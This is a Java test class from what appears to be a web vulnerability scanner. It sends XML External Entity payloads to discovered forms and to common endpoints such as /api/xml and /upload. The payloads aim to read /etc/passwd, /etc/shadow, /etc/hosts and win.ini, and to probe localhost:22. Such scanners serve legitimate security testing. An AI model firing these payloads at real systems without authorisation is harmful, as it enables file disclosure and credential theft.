package dev.ua.ikeepcalm.vynce.tests.impl;

import dev.ua.ikeepcalm.vynce.core.model.ScanContext;
import dev.ua.ikeepcalm.vynce.core.model.Vulnerability;
import dev.ua.ikeepcalm.vynce.core.model.source.Severity;
import dev.ua.ikeepcalm.vynce.core.model.source.TestType;
import dev.ua.ikeepcalm.vynce.crawler.FormData;
import dev.ua.ikeepcalm.vynce.tests.BaseVulnerabilityTest;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.util.Arrays;
import java.util.List;

public class XxeTest extends BaseVulnerabilityTest {

    private static final List<String> XXE_PAYLOADS = Arrays.asList(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:22\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hosts\">]><data>&file;</data>",
            "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/shadow\"> ]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>"
    );

    private static final List<String> XXE_INDICATORS = Arrays.asList(
            "root:x:", "daemon:", "bin:",  // /etc/passwd
            "[fonts]", "[extensions]",  // win.ini
            "localhost", "127.0.0.1"  // /etc/hosts
    );

    @Override
    public TestType getTestType() {
        return TestType.XXE;
    }

    @Override
    protected void runTests(ScanContext context) throws Exception {
        // Test forms that might accept XML
        for (FormData form : context.getCrawler().getDiscoveredForms()) {
            if ("POST".equalsIgnoreCase(form.getMethod())) {
                testXxeInForm(context, form);
            }
        }

        // Test common XML endpoints
        testXxeInEndpoints(context);
    }

    private void testXxeInForm(ScanContext context, FormData form) {
        for (String payload : XXE_PAYLOADS) {
            try {
                Request request = new Request.Builder()
                        .url(form.getAction())
                        .post(RequestBody.create(payload, MediaType.parse("application/xml")))
                        .addHeader("Content-Type", "application/xml")
                        .build();

                try (Response response = context.getHttpClient().executeRequest(request)) {
                    if (response.isSuccessful()) {
                        String body = response.body() != null ? response.body().string() : "";

                        if (containsXxeIndicators(body)) {
                            addVulnerability(createVulnerability(
                                    Severity.HIGH,
                                    "XML External Entity (XXE) Injection",
                                    "Form at '" + form.getAction() + "' is vulnerable to XXE",
                                    form.getAction(),
                                    payload
                            ));
                            break;
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore errors
            }
        }
    }

    private void testXxeInEndpoints(ScanContext context) {
        String[] commonXmlEndpoints = {"/api/xml", "/upload", "/process", "/import"};

        for (String endpoint : commonXmlEndpoints) {
            String targetUrl = context.getTargetUrl() + endpoint;

            for (String payload : XXE_PAYLOADS) {
                try {
                    Request request = new Request.Builder()
                            .url(targetUrl)
                            .post(RequestBody.create(payload, MediaType.parse("application/xml")))
                            .addHeader("Content-Type", "application/xml")
                            .build();

                    try (Response response = context.getHttpClient().executeRequest(request)) {
                        if (response.isSuccessful()) {
                            String body = response.body() != null ? response.body().string() : "";

                            if (containsXxeIndicators(body)) {
                                addVulnerability(createVulnerability(
                                        Severity.HIGH,
                                        "XML External Entity (XXE) Injection",
                                        "Endpoint '" + endpoint + "' is vulnerable to XXE",
                                        targetUrl,
                                        payload
                                ));
                                break;
                            }
                        }
                    }
                } catch (Exception e) {
                    // Ignore errors
                }
            }
        }
    }

    private boolean containsXxeIndicators(String body) {
        for (String indicator : XXE_INDICATORS) {
            if (body.contains(indicator)) {
                return true;
            }
        }
        return false;
    }
}
